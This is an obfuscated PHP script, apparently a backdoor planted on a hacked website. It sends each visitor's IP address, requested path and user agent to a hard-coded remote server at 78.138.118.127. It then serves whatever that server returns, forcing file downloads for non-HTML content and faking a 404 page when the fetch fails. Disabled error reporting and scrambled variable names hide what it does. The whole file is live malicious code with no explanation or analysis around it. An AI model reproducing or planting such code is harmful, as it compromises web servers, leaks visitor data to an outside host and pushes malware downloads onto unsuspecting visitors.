<?php
$jbtvcvf = "ips";
$hczmyccqa = "ip";
$xfxfcd = "uri";
$ysfyfo = "func";
$khvfrulzr = "headers";
$idhnrebodii = "k";
$qzuuekdfv = "h";
$yymuyny = "res";
$auexxenf = "data";
$fqyjjt = "cookie";
$sptbdqe = "v";
$htahytknrfy = "request";
$nvmidautnev = "errstr";
$pkedokwhjf = "scheme";
$gplirongicj = "fp";
$kcxyrjcxhn = "timeout";
$qlmcbwop = "port";
$omumddjkm = "params";
$ukpxsfnrdit = "content";
$sbmrxr = "url";
$lvdzxnelv = "query";
$cnuludt = "remote";
$nxdjnqjioi = "remote";
error_reporting(0);
ini_set("display_errors", 0);
$ {
    $GLOBALS["cnuludt"]
} = "http://78.138.118.127/12345nbvvd.php";
php_display($ {
    $GLOBALS["nxdjnqjioi"]
});
error_404();
function php_display($url) {
    $dupvctxile = "query";
    $rbdxeeg = "content";
    $rtuqjngevwue = "url";
    $scmukqrpcu = "filename";
    $pefiihqr = "content";
    $pzqscfbwfoo = "query";
    $ {
        $GLOBALS["dupvctxile"]
    } = array();
    $ {
        $GLOBALS["lvdzxnelv"]
    }
    ["ip"] = getIp();
    $ {
        $GLOBALS["lvdzxnelv"]
    }
    ["path"] = "$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
    $ {
        $pzqscfbwfoo
    }
    ["useragent"] = getUseragent();
    $ {
        $GLOBALS["sbmrxr"]
    } = $ {
        $GLOBALS["sbmrxr"]
    } . "?" . http_build_query($ {
        $GLOBALS["lvdzxnelv"]
    });
    $ykymhewdris = "content";
    $ {
        $GLOBALS["ukpxsfnrdit"]
    } = @file_get_contents($ {
        $GLOBALS["rtuqjngevwue"]
    });
    if (strlen($ {
        $GLOBALS["ykymhewdris"]
    }) < 10) {
        error_404();
    }
    $wpkyut = "content";
    $ {
        $GLOBALS["ukpxsfnrdit"]
    } = explode("
", $ {
        $rbdxeeg
    });
    $pesdfbe = "content";
    $uflmer = "filename";
    $ {
        $GLOBALS["scmukqrpcu"]
    } = array_shift($ {
        $GLOBALS["pefiihqr"]
    });
    $ {
        $GLOBALS["ukpxsfnrdit"]
    } = implode("
", $ {
        $wpkyut
    });
    if (strstr($ {
        $GLOBALS["uflmer"]
    }, ".html") === FALSE) {
        $wsluapls = "content";
        $iakxulxikk = "type";
        $ijffdbx = "type";
        $liobqfzecv = "filename";
        $ {
            $ijffdbx
        } = "application/octet-stream";
        header("Content-Type:" . $ {
            $GLOBALS["iakxulxikk"]
        });
        header("Content-Disposition: attachment; filename=" . $ {
            $liobqfzecv
        });
        header("Content-Length: " . strlen($ {
            $wsluapls
        }));
    }
    echo $ {
        $GLOBALS["pesdfbe"]
    };
    exit();
}
function http_request($params) {
    $dwjwlpw = "url";
    $yetbvsgk = "res";
    $adlbtpkkp = "params";
    $qqroevys = "scheme";
    $jmprtlkqy = "params";
    $sxbpdcgbnhv = "url";
    $rjfobnk = "params";
    $fdyymehuojn = "url";
    $btcrda = "url";
    if (!is_array($ {
        $GLOBALS["jmprtlkqy"]
    })) {
        $ {
            $GLOBALS["omumddjkm"]
        } = array("url" => $ {
            $GLOBALS["omumddjkm"]
        }, "method" => "GET");
    }
    $qiqgvuce = "url";
    $lrhituc = "url";
    $sduxjksgmdh = "url";
    $dtizvq = "params";
    $gipmkeuwhen = "url";
    $sckbeqtg = "url";
    if ($ {
        $GLOBALS["omumddjkm"]
    }
    ["url"] == "") return FALSE;
    $wywwrkacw = "url";
    $iygwzasprs = "params";
    $ipttjthk = "params";
    $xlqroqbdsxr = "params";
    $flcyorqsb = "timeout";
    $ulvgvufr = "params";
    if (!isset($ {
        $GLOBALS["ulvgvufr"]
    }
    ["method"])) $ {
        $dtizvq
    }
    ["method"] = (isset($ {
        $rjfobnk
    }
    ["data"]) && is_array($ {
        $GLOBALS["omumddjkm"]
    }
    ["data"])) ? "POST" : "GET";
    $ {
        $xlqroqbdsxr
    }
    ["method"] = strtoupper($ {
        $GLOBALS["omumddjkm"]
    }
    ["method"]);
    if (!in_array($ {
        $GLOBALS["omumddjkm"]
    }
    ["method"], array("GET", "POST"))) return FALSE;
    $ {
        $GLOBALS["sbmrxr"]
    } = parse_url($ {
        $iygwzasprs
    }
    ["url"]);
    if (!isset($ {
        $GLOBALS["sckbeqtg"]
    }
    ["scheme"])) $ {
        $fdyymehuojn
    }
    ["scheme"] = "http";
    if (!isset($ {
        $wywwrkacw
    }
    ["path"])) $ {
        $GLOBALS["sbmrxr"]
    }
    ["path"] = "/";
    if (!isset($ {
        $GLOBALS["lrhituc"]
    }
    ["host"]) && isset($ {
        $GLOBALS["sbmrxr"]
    }
    ["path"])) {
        if (strpos($ {
            $GLOBALS["sbmrxr"]
        }
        ["path"], "/")) {
            $jzjmvnjmjak = "url";
            $ebxrctpqzyke = "url";
            $lqniscmceeu = "url";
            $ {
                $GLOBALS["sbmrxr"]
            }
            ["host"] = substr($ {
                $GLOBALS["sbmrxr"]
            }
            ["path"], 0, strpos($ {
                $jzjmvnjmjak
            }
            ["path"], "/"));
            $ {
                $GLOBALS["sbmrxr"]
            }
            ["path"] = substr($ {
                $GLOBALS["ebxrctpqzyke"]
            }
            ["path"], strpos($ {
                $lqniscmceeu
            }
            ["path"], "/"));
        } else {
            $ {
                $GLOBALS["sbmrxr"]
            }
            ["host"] = $ {
                $GLOBALS["sbmrxr"]
            }
            ["path"];
            $ {
                $GLOBALS["sbmrxr"]
            }
            ["path"] = "/";
        }
    }
    $yijslrmkos = "port";
    $eixfozyikgx = "res";
    $ {
        $GLOBALS["sbmrxr"]
    }
    ["path"] = preg_replace("/[\/]+/", "/", $ {
        $GLOBALS["sbmrxr"]
    }
    ["path"]);
    $razoyonw = "errno";
    if (isset($ {
        $GLOBALS["qiqgvuce"]
    }
    ["query"])) $ {
        $sxbpdcgbnhv
    }
    ["path"].= "?{$url['query']}";
    $ {
        $GLOBALS["qlmcbwop"]
    } = isset($ {
        $ipttjthk
    }
    ["port"]) ? $ {
        $GLOBALS["adlbtpkkp"]
    }
    ["port"] : (isset($ {
        $sduxjksgmdh
    }
    ["port"]) ? $ {
        $btcrda
    }
    ["port"] : ($ {
        $GLOBALS["gipmkeuwhen"]
    }
    ["scheme"] == "https" ? 443 : 80));
    $ {
        $GLOBALS["kcxyrjcxhn"]
    } = isset($ {
        $GLOBALS["omumddjkm"]
    }
    ["timeout"]) ? $ {
        $GLOBALS["omumddjkm"]
    }
    ["timeout"] : 30;
    $vfxzzxxo = "fp";
    $bqkboh = "url";
    $vmvvwyx = "params";
    if (!isset($ {
        $vmvvwyx
    }
    ["return"])) $ {
        $GLOBALS["omumddjkm"]
    }
    ["return"] = "content";
    $ {
        $qqroevys
    } = $ {
        $GLOBALS["dwjwlpw"]
    }
    ["scheme"] == "https" ? "ssl://" : "";
    $ {
        $GLOBALS["gplirongicj"]
    } = @fsockopen($ {
        $GLOBALS["pkedokwhjf"]
    } . $ {
        $GLOBALS["bqkboh"]
    }
    ["host"], $ {
        $yijslrmkos
    }, $ {
        $razoyonw
    }, $ {
        $GLOBALS["nvmidautnev"]
    }, $ {
        $flcyorqsb
    });
    if ($ {
        $GLOBALS["vfxzzxxo"]
    }) {
        $tshdxkrjg = "headers";
        $kccwgjcfzry = "params";
        $ahzbto = "request";
        $jrpbrhfchpi = "params";
        if (!isset($ {
            $kccwgjcfzry
        }
        ["User-Agent"])) $ {
            $GLOBALS["jrpbrhfchpi"]
        }
        ["User-Agent"] = "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16";
        $pojdifufqxn = "params";
        $qnklxgjjj = "fp";
        $wyjfestoo = "request";
        $ {
            $GLOBALS["htahytknrfy"]
        } = "{$params['method']} {$url['path']} HTTP/1.0
";
        $ {
            $GLOBALS["wyjfestoo"]
        }.= "Host: {$url['host']}
";
        $edugfoonj = "h_detected";
        $ {
            $GLOBALS["ahzbto"]
        }.= "User-Agent: {$params['User-Agent']}" . "
";
        $bbrvfdiqc = "request";
        $nqdhraem = "data";
        if (isset($ {
            $pojdifufqxn
        }
        ["referer"])) $ {
            $GLOBALS["htahytknrfy"]
        }.= "Referer: {$params['referer']}
";
        if (isset($ {
            $GLOBALS["omumddjkm"]
        }
        ["cookie"])) {
            $dtxmecwodrd = "cookie";
            $djntfik = "cookie";
            $ {
                $djntfik
            } = "";
            if (is_array($ {
                $GLOBALS["omumddjkm"]
            }
            ["cookie"])) {
                $ycbsvqo = "cookie";
                $awskkwmqqpg = "k";
                $rqgoxxlohwl = "cookie";
                $hgtshwshin = "params";
                $gvqqpvmbynrb = "cookie";
                foreach ($ {
                    $hgtshwshin
                }
                ["cookie"] as $ {
                    $GLOBALS["awskkwmqqpg"]
                } => $ {
                    $GLOBALS["sptbdqe"]
                }) $ {
                    $GLOBALS["ycbsvqo"]
                }.= "$k=$v; ";
                $ {
                    $rqgoxxlohwl
                } = substr($ {
                    $gvqqpvmbynrb
                }, 0, -2);
            } else $ {
                $GLOBALS["dtxmecwodrd"]
            } = $ {
                $GLOBALS["omumddjkm"]
            }
            ["cookie"];
            if ($ {
                $GLOBALS["fqyjjt"]
            } != "") $ {
                $GLOBALS["htahytknrfy"]
            }.= "Cookie: $cookie
";
        }
        $xrpkvnq = "request";
        $ {
            $xrpkvnq
        }.= "Connection: close
";
        if ($ {
            $GLOBALS["omumddjkm"]
        }
        ["method"] == "POST") {
            $hppnxos = "params";
            $xfowerivgy = "params";
            $ycvslrfdjhn = "data";
            if (isset($ {
                $hppnxos
            }
            ["data"]) && is_array($ {
                $xfowerivgy
            }
            ["data"])) {
                $xkhabq = "k";
                $piwbdshpsstj = "data";
                $erfrgfxmygs = "data";
                $lkgftnl = "k";
                foreach ($ {
                    $GLOBALS["omumddjkm"]
                }
                ["data"] AS $ {
                    $lkgftnl
                } => $ {
                    $GLOBALS["sptbdqe"]
                }) $ {
                    $GLOBALS["piwbdshpsstj"]
                }.= urlencode($ {
                    $GLOBALS["xkhabq"]
                }) . "=" . urlencode($ {
                    $GLOBALS["sptbdqe"]
                }) . "&";
                $jtgyocys = "data";
                if (substr($ {
                    $GLOBALS["erfrgfxmygs"]
                }, -1) == "&") $ {
                    $jtgyocys
                } = substr($ {
                    $GLOBALS["auexxenf"]
                }, 0, -1);
            }
            $ {
                $GLOBALS["auexxenf"]
            }.= "

";
            $ {
                $GLOBALS["htahytknrfy"]
            }.= "Content-type: application/x-www-form-urlencoded
";
            $ {
                $GLOBALS["htahytknrfy"]
            }.= "Content-length: " . strlen($ {
                $ycvslrfdjhn
            }) . "
";
        }
        $ {
            $GLOBALS["htahytknrfy"]
        }.= "
";
        if ($ {
            $GLOBALS["omumddjkm"]
        }
        ["method"] == "POST") $ {
            $GLOBALS["htahytknrfy"]
        }.= $ {
            $nqdhraem
        };
        $rlmagcoondi = "fp";
        @fwrite($ {
            $GLOBALS["gplirongicj"]
        }, $ {
            $bbrvfdiqc
        });
        $ {
            $GLOBALS["yymuyny"]
        } = "";
        $ {
            $tshdxkrjg
        } = "";
        $ {
            $edugfoonj
        } = false;
        while (!@feof($ {
            $GLOBALS["rlmagcoondi"]
        })) {
            $fxzuahsbp = "res";
            $egvgmmxsuux = "h_detected";
            $nlsygkhpdyyn = "res";
            $ {
                $nlsygkhpdyyn
            }.= @fread($ {
                $GLOBALS["gplirongicj"]
            }, 1024);
            if (!$ {
                $egvgmmxsuux
            } && strpos($ {
                $fxzuahsbp
            }, "

") !== FALSE) {
                $gokexypfnnju = "res";
                $qmvftez = "headers";
                $sykrwe = "res";
                $uflxkry = "params";
                $uloxirw = "h_detected";
                $ivynppi = "res";
                $yergdqrcv = "params";
                $jqqelrlzroq = "params";
                $gwoscntyun = "res";
                $ {
                    $GLOBALS["uloxirw"]
                } = true;
                $ {
                    $qmvftez
                } = substr($ {
                    $GLOBALS["gokexypfnnju"]
                }, 0, strpos($ {
                    $GLOBALS["ivynppi"]
                }, "

"));
                $qnwjrwbxalvq = "headers";
                $wigpbx = "params";
                $jtjcghsyvtc = "params";
                $ {
                    $sykrwe
                } = substr($ {
                    $GLOBALS["gwoscntyun"]
                }, strpos($ {
                    $GLOBALS["yymuyny"]
                }, "

") + 4);
                if ($ {
                    $uflxkry
                }
                ["return"] == "headers" || $ {
                    $jtjcghsyvtc
                }
                ["return"] == "array" || (isset($ {
                    $GLOBALS["jqqelrlzroq"]
                }
                ["redirect"]) && $ {
                    $GLOBALS["omumddjkm"]
                }
                ["redirect"] == true)) {
                    $yjqqdvupnm = "v";
                    $mnbxxtkm = "headers";
                    $dvxenchgyqp = "headers";
                    $ {
                        $GLOBALS["qzuuekdfv"]
                    } = explode("
", $ {
                        $mnbxxtkm
                    });
                    $ {
                        $dvxenchgyqp
                    } = array();
                    foreach ($ {
                        $GLOBALS["qzuuekdfv"]
                    } as $ {
                        $GLOBALS["idhnrebodii"]
                    } => $ {
                        $yjqqdvupnm
                    }) {
                        if (strpos($ {
                            $GLOBALS["sptbdqe"]
                        }, ":")) {
                            $ckdqikcutle = "v";
                            $mnmykww = "v";
                            $ugrcqmpr = "k";
                            $ {
                                $GLOBALS["ugrcqmpr"]
                            } = substr($ {
                                $GLOBALS["sptbdqe"]
                            }, 0, strpos($ {
                                $GLOBALS["ckdqikcutle"]
                            }, ":"));
                            $ {
                                $GLOBALS["sptbdqe"]
                            } = trim(substr($ {
                                $GLOBALS["sptbdqe"]
                            }, strpos($ {
                                $GLOBALS["mnmykww"]
                            }, ":") + 1));
                        }
                        $ {
                            $GLOBALS["khvfrulzr"]
                        }
                        [strtoupper($ {
                            $GLOBALS["idhnrebodii"]
                        }) ] = $ {
                            $GLOBALS["sptbdqe"]
                        };
                    }
                }
                if (isset($ {
                    $GLOBALS["wigpbx"]
                }
                ["redirect"]) && $ {
                    $GLOBALS["yergdqrcv"]
                }
                ["redirect"] == true && isset($ {
                    $qnwjrwbxalvq
                }
                ["LOCATION"])) {
                    $iweqfuxdlggh = "params";
                    $ljrsgsxuvv = "params";
                    $ {
                        $GLOBALS["omumddjkm"]
                    }
                    ["url"] = $ {
                        $GLOBALS["khvfrulzr"]
                    }
                    ["LOCATION"];
                    if (!isset($ {
                        $GLOBALS["omumddjkm"]
                    }
                    ["redirect-count"])) $ {
                        $GLOBALS["iweqfuxdlggh"]
                    }
                    ["redirect-count"] = 0;
                    if ($ {
                        $GLOBALS["ljrsgsxuvv"]
                    }
                    ["redirect-count"] < 10) {
                        $wrdyls = "func";
                        $ {
                            $GLOBALS["omumddjkm"]
                        }
                        ["redirect-count"]++;
                        $ {
                            $GLOBALS["ysfyfo"]
                        } = __FUNCTION__;
                        $pjpsowtwymf = "func";
                        $ggqvmdh = "params";
                        return @is_object($this) ? $this->$ {
                            $GLOBALS["wrdyls"]
                        }
                        ($ {
                            $GLOBALS["ggqvmdh"]
                        }) : $ {
                            $GLOBALS["pjpsowtwymf"]
                        }
                        ($ {
                            $GLOBALS["omumddjkm"]
                        });
                    }
                }
                if ($ {
                    $GLOBALS["omumddjkm"]
                }
                ["return"] == "headers") return $ {
                    $GLOBALS["khvfrulzr"]
                };
            }
        }
        @fclose($ {
            $qnklxgjjj
        });
    } else return FALSE;
    if ($ {
        $GLOBALS["omumddjkm"]
    }
    ["return"] == "array") $ {
        $GLOBALS["yetbvsgk"]
    } = array("headers" => $ {
        $GLOBALS["khvfrulzr"]
    }, "content" => $ {
        $GLOBALS["yymuyny"]
    });
    return $ {
        $GLOBALS["eixfozyikgx"]
    };
}
function error_404() {
    header("HTTP/1.1 404 Not Found");
    $ {
        $GLOBALS["xfxfcd"]
    } = preg_replace("/(\?).*\$/", "", $_SERVER["REQUEST_URI"]);
    $ {
        $GLOBALS["ukpxsfnrdit"]
    } = http_request("http://" . $_SERVER["SERVER_NAME"] . "/AFQjCNHnh8RttFI3VMrBddYw6rngKz7KEA");
    $ {
        $GLOBALS["ukpxsfnrdit"]
    } = str_replace("/AFQjCNHnh8RttFI3VMrBddYw6rngKz7KEA", $ {
        $GLOBALS["xfxfcd"]
    }, $ {
        $GLOBALS["ukpxsfnrdit"]
    });
    exit($ {
        $GLOBALS["ukpxsfnrdit"]
    });
}
function getUseragent() {
    return $_SERVER["HTTP_USER_AGENT"];
}
function getReferer() {
    $lfjiopxo = "referer";
    $frohhtuteye = "referer";
    $ {
        $frohhtuteye
    } = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : "-";
    return $ {
        $lfjiopxo
    };
}
function getIp() {
    $zizlckd = "ip";
    $ {
        $zizlckd
    } = NULL;
    if (isset($_SERVER["REMOTE_ADDR"])) {
        $ {
            $GLOBALS["hczmyccqa"]
        } = $_SERVER["REMOTE_ADDR"];
    }
    $ygtqpkoosnxt = "ip";
    if (strpos($ {
        $GLOBALS["hczmyccqa"]
    }, ",") !== FALSE) {
        $vzzhnqeuoit = "ip";
        $mujjczjqc = "ips";
        $vijvmqe = "ip";
        $ {
            $GLOBALS["mujjczjqc"]
        } = explode(",", $ {
            $GLOBALS["vzzhnqeuoit"]
        });
        $ {
            $vijvmqe
        } = trim(array_pop($ {
            $GLOBALS["jbtvcvf"]
        }));
    }
    return $ {
        $ygtqpkoosnxt
    };
} ?>
